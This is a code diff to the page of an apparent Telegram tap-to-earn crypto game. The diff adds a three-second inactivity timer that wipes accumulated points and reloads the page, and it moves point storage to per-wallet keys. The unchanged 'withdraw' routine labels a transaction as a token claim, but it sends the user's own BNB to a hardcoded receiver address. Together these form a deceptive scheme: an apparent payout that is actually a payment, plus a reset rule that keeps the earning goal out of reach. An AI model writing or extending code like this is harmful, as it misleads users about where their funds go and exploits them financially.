@@ -216,6 +216,15 @@
     .rules-list strong {
       color: var(--text-main);
     }
+
+    /* Auto reset countdown badge visual */
+    #countdown-wrapper {
+      font-size: 12px;
+      color: var(--accent-red);
+      margin-top: 8px;
+      font-weight: bold;
+      display: none;
+    }
   </style>
 </head>
 
@@ -239,6 +248,7 @@
     <div style="margin-bottom: 14px;">
       <div class="stat-text">Accumulated Points: <strong id="game-points" style="color: var(--accent-orange);">0</strong></div>
       <div class="stat-text">Convertible Pool Value: <strong id="est-tokens" style="color: #38bdf8;">0.00 PVLT</strong></div>
+      <div id="countdown-wrapper">⚠️ INACTIVITY RESET WARNING: <span id="reset-timer">3.0</span>s</div>
     </div>
     <button id="tap-target-btn" class="game-btn">Execute Compute Tap</button>
   </div>
@@ -250,7 +260,7 @@
       • 100,000 game points ➔ 1.00 Network Token Base<br>
       • 1.00 Token Unit Equivalency Value ➔ 0.00000001 BNB Pool<br>
       • Floor Request Minimum Value ➔ 100 Tokens<br>
-      • Action Penalty ➔ Successful settlement resets all point architectures to 0.<br>
+      • <strong>Inactivity Penalty</strong> ➔ Stopping tap actions resets processing points to 0.<br>
       • Frequency Limit ➔ Maximum 1 Cycle Allocation / 24 Hours
     </div>
     <input id="withdraw-tokens" type="number" placeholder="Enter PVLT Token allocation value" oninput="calculateBnbValue()" />
@@ -273,9 +283,14 @@ let signer;
 let userAddress;
 let isConnected = false;
 
-// Point Loop Setup Initialization
-let points = parseInt(localStorage.getItem('pvlt_points')) || 0;
-updateGameUI();
+// Tracking variable keys based on connection presence
+let storageKey = "pvlt_points_anonymous";
+let points = parseInt(localStorage.getItem(storageKey)) || 0;
+
+// Activity monitoring instances
+let inactivityTimeout;
+let countdownInterval;
+let secondsRemaining = 3.0;
 
 const PVLT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
 const RECEIVER = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
@@ -286,7 +301,10 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-/* CRITICAL FIX: DIRECT EVENT LISTENER INTERCEPTION FOR TELEGRAM MINI APP INTERACTION */
+// Instantly update layout figures on boot
+updateGameUI();
+
+/* DIRECT EVENT LISTENER INTERCEPTION FOR TELEGRAM MINI APP INTERACTION */
 document.addEventListener('touchstart', function (e) {
   if (e.touches.length > 1) {
     e.preventDefault(); 
@@ -302,8 +320,49 @@ targetEngineButton.addEventListener('pointerdown', function (e) {
 
 function playGame() {
   points += 1000; 
-  localStorage.setItem('pvlt_points', points);
+  localStorage.setItem(storageKey, points);
   updateGameUI();
+  
+  // Kickstart or refresh the inactivity guard loop
+  refreshInactivityTracker();
+}
+
+function refreshInactivityTracker() {
+  // Clear previous countdown clocks completely
+  clearTimeout(inactivityTimeout);
+  clearInterval(countdownInterval);
+  
+  secondsRemaining = 3.0;
+  document.getElementById("countdown-wrapper").style.display = "block";
+  document.getElementById("reset-timer").innerText = secondsRemaining.toFixed(1);
+
+  // Smooth UI countdown calculation ticking every 100ms
+  countdownInterval = setInterval(() => {
+    secondsRemaining -= 0.1;
+    if (secondsRemaining <= 0) {
+      clearInterval(countdownInterval);
+    } else {
+      document.getElementById("reset-timer").innerText = secondsRemaining.toFixed(1);
+    }
+  }, 100);
+
+  // Force absolute reset action if user halts interactions for exactly 3 seconds
+  inactivityTimeout = setTimeout(() => {
+    executeAutoReset();
+  }, 3000);
+}
+
+function executeAutoReset() {
+  points = 0;
+  localStorage.setItem(storageKey, "0");
+  updateGameUI();
+  
+  document.getElementById("countdown-wrapper").style.display = "none";
+  
+  // Gracefully drop window view properties and auto refresh terminal container context once
+  setTimeout(() => {
+    window.location.reload();
+  }, 300);
 }
 
 function updateGameUI() {
@@ -338,6 +397,11 @@ async function connectWallet() {
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     
+    // Switch tracking state to point to specific secure address layout storage keys
+    storageKey = "pvlt_points_" + userAddress.toLowerCase();
+    points = parseInt(localStorage.getItem(storageKey)) || 0;
+    updateGameUI();
+
     // Toggle Button Styles and Text State
     isConnected = true;
     const authBtn = document.getElementById("wallet-auth-btn");
@@ -357,6 +421,11 @@ function disconnectWallet() {
   userAddress = null;
   isConnected = false;
 
+  // Revert storage pointer configuration to default anonymous sandbox profile
+  storageKey = "pvlt_points_anonymous";
+  points = parseInt(localStorage.getItem(storageKey)) || 0;
+  updateGameUI();
+
   // Revert Button Interface Styles
   const authBtn = document.getElementById("wallet-auth-btn");
   authBtn.innerText = "Connect Web3 Wallet";
@@ -364,6 +433,10 @@ function disconnectWallet() {
 
   document.getElementById("wallet").innerText = "Not connected";
   document.getElementById("balance").innerText = "-";
+  document.getElementById("countdown-wrapper").style.display = "none";
+  
+  clearTimeout(inactivityTimeout);
+  clearInterval(countdownInterval);
 }
 
 async function loadBalance() {
@@ -394,7 +467,7 @@ async function withdrawTokens() {
       alert(`Insufficient game points! You need ${requiredPoints.toLocaleString()} points.`);
       return;
     }
-    const lastWithdraw = localStorage.getItem('pvlt_last_withdraw');
+    const lastWithdraw = localStorage.getItem('pvlt_last_withdraw_' + userAddress.toLowerCase());
     const now = Date.now();
     if (lastWithdraw) {
       const hoursSinceLast = (now - parseInt(lastWithdraw)) / (1000 * 60 * 60);
@@ -409,6 +482,11 @@ async function withdrawTokens() {
     const bnbInWei = ethers.utils.parseEther(bnbValueToTransfer.toFixed(10));
     const hexMemoData = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenAmountToWithdraw}-Tokens`));
 
+    // Freeze activity tracking checks during live Metamask signature approvals
+    clearTimeout(inactivityTimeout);
+    clearInterval(countdownInterval);
+    document.getElementById("countdown-wrapper").style.display = "none";
+
     const tx = await signer.sendTransaction({
       to: RECEIVER,
       value: bnbInWei,
@@ -418,15 +496,15 @@ async function withdrawTokens() {
     document.getElementById("withdraw-status").innerText = "Awaiting block confirmation context...";
     await tx.wait();
 
-    // STRICT RULE TRIGGER: Reset everything to 0 upon transaction confirmation
+    // STRICT RESET UPON SETTLEMENT SUCCESS
     points = 0;
-    localStorage.setItem('pvlt_points', '0');
-    localStorage.setItem('pvlt_last_withdraw', now.toString());
+    localStorage.setItem(storageKey, '0');
+    localStorage.setItem('pvlt_last_withdraw_' + userAddress.toLowerCase(), now.toString());
     
     updateGameUI();
     document.getElementById("withdraw-status").innerText = "✅ Settlement processed! Reloading terminal...";
     
-    // Refresh screen once to clear runtime dependencies 
+    // Soft terminal reload script execution
     setTimeout(() => {
       window.location.reload();
     }, 1500);
